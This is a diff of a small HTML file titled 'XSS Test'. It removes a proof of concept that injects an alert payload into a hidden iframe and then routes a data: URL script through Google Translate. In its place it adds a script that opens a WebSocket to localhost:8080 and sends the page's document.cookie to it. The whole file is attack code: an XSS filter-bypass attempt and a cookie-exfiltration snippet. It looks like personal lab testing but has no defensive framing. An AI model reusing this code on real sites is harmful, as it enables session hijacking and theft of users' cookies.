@@ -2,42 +2,20 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Redirect XSS</title>
+    <title>XSS Test</title>
 </head>
 <body>
-    <iframe id="xssFrame" src="about:blank" style="display:none;"></iframe>
     <script>
-        // Funzione per impostare il contenuto dell'iframe
-        function setIframeContent() {
-            var iframe = document.getElementById('xssFrame');
-            var doc = iframe.contentWindow.document;
-            doc.open();
-            doc.write(`
-                <!DOCTYPE html>
-                <html lang="en">
-                <head>
-                    <meta charset="UTF-8">
-                    <title>XSS</title>
-                </head>
-                <body>
-                    <script>alert('XSS');</script>
-                </body>
-                </html>
-            `);
-            doc.close();
-        }
+        const ws = new WebSocket('ws://localhost:8080');
 
-        // Reindirizza l'iframe a Google Translate con il payload XSS
-        function redirectIframe() {
-            var iframe = document.getElementById('xssFrame');
-            iframe.src = "https://translate.google.com/translate?sl=auto&tl=en&u=" + encodeURIComponent("data:text/html," + encodeURIComponent('<script>alert(\'XSS\');</script>'));
-        }
+        ws.onopen = () => {
+            const cookies = document.cookie;
+            ws.send(cookies);
+        };
 
-        // Esegui le funzioni in sequenza
-        setIframeContent();
-        setTimeout(redirectIframe, 1000);  // Attendi un secondo prima di reindirizzare
+        ws.onmessage = (event) => {
+            console.log('Message from server:', event.data);
+        };
     </script>
 </body>
 </html>
-
-
